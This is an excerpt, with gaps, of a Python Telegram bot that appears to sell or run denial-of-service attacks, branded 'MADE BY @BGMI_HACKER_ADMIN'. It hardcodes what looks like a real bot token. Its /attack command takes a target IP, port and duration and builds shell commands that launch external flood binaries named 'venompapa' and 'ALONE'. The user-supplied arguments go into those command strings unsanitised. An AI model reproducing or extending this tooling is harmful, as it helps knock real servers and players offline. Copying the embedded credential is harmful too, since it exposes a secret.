...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7304324962:AAEwQZfFHv7YFg8mgnpIDdP7tAMbRkiIIVk'
ADMIN_USER_ID = 6676440528
ADMIN_USER_ID = 6676440528
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "*Let the war begin! ⚔️💥 MADE BY @BGMI_HACKER_ADMIN*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>* MADE BY @BGMI_HACKER_ADMIN", parse_mode='Markdown')
        return
    ...
    if argument_type == 3:
        attack_command = f"./venompapa {ip} {port} {duration} 1200"
    elif argument_type == 4:
        attack_command = f"./ALONE {ip} {port} {duration} {threads} "
